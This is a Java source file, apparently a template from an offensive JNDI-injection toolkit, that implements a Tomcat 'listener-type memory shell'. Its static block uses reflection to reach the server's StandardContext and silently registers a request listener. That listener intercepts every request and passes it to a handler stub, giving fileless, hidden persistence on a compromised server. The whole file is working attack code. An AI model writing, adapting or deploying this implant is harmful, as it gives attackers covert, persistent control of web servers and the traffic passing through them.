package com.qi4l.jndi.template.memshell.tomcat;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;

/**
 * 使用线程注入 Tomcat Listener 型内存马
 */
public class TFMSFromThreadLi implements ServletRequestListener {
    static {
        try {
            // 获取 standardContext
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

            StandardContext standardContext;

            try {
                standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            } catch (Exception ignored) {
                Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                field.setAccessible(true);
                Object root   = field.get(webappClassLoaderBase);
                Field  field2 = root.getClass().getDeclaredField("context");
                field2.setAccessible(true);

                standardContext = (StandardContext) field2.get(root);
            }

            TFMSFromThreadLi listener = new TFMSFromThreadLi();
            standardContext.addApplicationEventListener(listener);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
            Field         field         = requestFacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request  request  = (Request) field.get(requestFacade);
            Response response = request.getResponse();
            requestInitializedHandle(request, response);
        } catch (Exception ignore) {
        }
    }

    public void requestInitializedHandle(HttpServletRequest request, HttpServletResponse response) {
    }
}
